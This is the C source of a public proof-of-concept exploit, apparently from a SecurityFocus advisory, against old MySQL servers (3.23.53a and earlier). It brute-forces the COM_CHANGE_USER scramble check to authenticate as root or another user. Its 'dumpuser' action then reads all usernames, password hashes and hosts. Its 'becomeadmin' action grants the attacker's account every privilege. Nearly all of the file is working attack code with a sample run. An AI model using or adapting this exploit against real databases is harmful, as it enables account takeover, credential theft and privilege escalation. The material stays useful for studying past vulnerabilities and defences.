/*
source: http://www.securityfocus.com/bid/6373/info

A flaw in the password authentication mechanism for MySQL may make it possible for an authenticated database user to compromise the accounts of other database users. 

The flaw lies in the fact that the server uses a string returned by the client when the COM_CHANGE_USER command is issued to iterate through a comparison when attempting to authenticate the password. An attacker may authenticate as another database user if they can successfully guess the first character of the correct password for that user. The range of the valid character set for passwords is 32 characters, which means that a malicious user can authenticate after a maximum of 32 attempts if they cycle through all of the valid characters.
*/

/***********************************************************
 * hoagie_mysql.c
 *
 * local and remote exploit for mysql <= 3.23.53a 
 *
 * new years present .... works also for 3.23.54 openbsd
 *			  (head) date 16/12/2002
 *
 * hey after some code checking and patching my mysql server
 * i relized, that this patch doesnt protect you against 
 * this vulnerability.
 * The length of the scramble string is important for the
 * password check and not the length of the password.
 *
 * perhaps other system are also still vulnerable
 *
 * gcc hoagie_mysql.c -o hoagie_mysql -lmysqlclient -I/usr/local/include -L/usr/local/lib/mysql
 *
 * Author: Andi <andi@void.at>
 *
 * Greetz to Greuff, philipp and the other hoagie-fellas :-)
 *
 * With this exploit you can also do that nasty things:
 *   http://void.at/andi/mysql.pdf
 *
 * $ ./hoagie_mysql -u dbuser -p dbpass
 * connecting to [localhost] as [dbpass] ... ok
 * sending one byte requests with user [root] ...
 *           root 13fb921913f4b3b1 
 *           root                  
 *           ...........
 *           ........
 * $
 *
 * If root or the attack user has no passwort set, this
 * exploit will fail -> thx to philipp
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
 * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY 
 * DAMAGE DONE USING THIS PROGRAM.
 *
 ************************************************************/
#include <stdio.h>
#include <unistd.h>
#include <mysql/mysql.h>

int do_attack(MYSQL *mysql, char *attackuser);
void do_action(MYSQL *mysql, char *action, char *user);
char *strmov(register char *dst, register const char *src);

int main(int argc, char **argv) {
   MYSQL mysql;
   char optchar;
   char *target, *user, *password, *attackuser, *action;

   target = user = password = action = attackuser= NULL;

   while ( (optchar = getopt(argc, argv, "ht:u:p:a:e:")) != EOF ) {
       switch(optchar) { 
           case 'h': printf("hoagie_mysql.c\n");
                     printf("-t ... mysql server (default localhost)\n");
      		     printf("-u ... username (default empty)\n");
                     printf("-p ... password (default empty)\n");
                     printf("-a ... attack user (default root)\n");
                     printf("-e ... action\n");
                     printf("-h ... this screen\n");
                     exit(0);
           case 't': target = optarg;
                     break;
           case 'u': user = optarg;
                     break;
           case 'p': password = optarg;
                     break;
           case 'a': attackuser = optarg;
                     break;
           case 'e': action = optarg;
       }
   }

   if (!target) target = "localhost";
   if (!user) user = "";
   if (!password) password = "";
   if (!attackuser) attackuser = "root";
   if (!action) action = "dumpuser";

   printf("connecting to [%s] as [%s] ... ", target, user);
   fflush(stdin);

   if (!mysql_connect(&mysql, target, user, password)) {
       printf("failed\n");
       return 0;
   } else {
       printf("ok\n");
   }

   printf("sending one byte requests with user [%s] ... \n", attackuser);
   if (!do_attack(&mysql, attackuser)) {
       do_action(&mysql, action, user);
   } else {
       printf("attack failed\n");
   }
   mysql_close(&mysql);

   return 0;
}

int do_attack(MYSQL *mysql, char *attackuser) {
   char buff[512], *pos=buff, *attackpasswd = "A";
   int i, len, j, ret = 1;

   pos = (char*)strmov(pos,attackuser)+1;
   mysql->scramble_buff[1] = 0;
   pos = scramble(pos, mysql->scramble_buff, attackpasswd,
               (my_bool) (mysql->protocol_version == 9));
   pos = (char*)strmov(pos+1,"");
   len = pos-buff;

   for (j = 0; ret && j < 32; j++) {
       buff[5] = 65 + j; 
       ret = simple_command(mysql,COM_CHANGE_USER, buff,(uint)len,0);
   }

   return ret;
}

void do_action(MYSQL *mysql, char *action, char *user) {
   MYSQL_ROW row;
   MYSQL_RES *result;
   char buf[512];

   mysql_select_db(mysql, "mysql");

   if (!strcmp(action, "dumpuser")) {
      mysql_query(mysql, "select user, password, host from user");
      result = mysql_use_result(mysql);

      while ((row = mysql_fetch_row(result)))
          printf("%16s %16s %50s\n", row[0], row[1], row[2]);
      mysql_free_result(result);
   } else if (!strcmp(action, "becomeadmin")) {
      snprintf(buf, sizeof(buf) - 1,
               "update user set Select_priv='Y', Insert_priv='Y', Update_priv='Y', Delete_priv='Y', "
               " Create_priv='Y', Drop_priv='Y', Reload_priv='Y', Shutdown_priv='Y', Process_priv='Y', "
               " File_priv='Y', Grant_priv='Y', References_priv='Y', Index_priv='Y', Alter_priv='Y' where "
               " user = '%s'", user);       
      mysql_query(mysql, buf);
      mysql_reload(mysql);
   } /* do whatever you want ... see mysql api ... // else if ( */
}

char *strmov(register char *dst, register const char *src)
{
	  while ((*dst++ = *src++)) ;
	    return dst-1;
}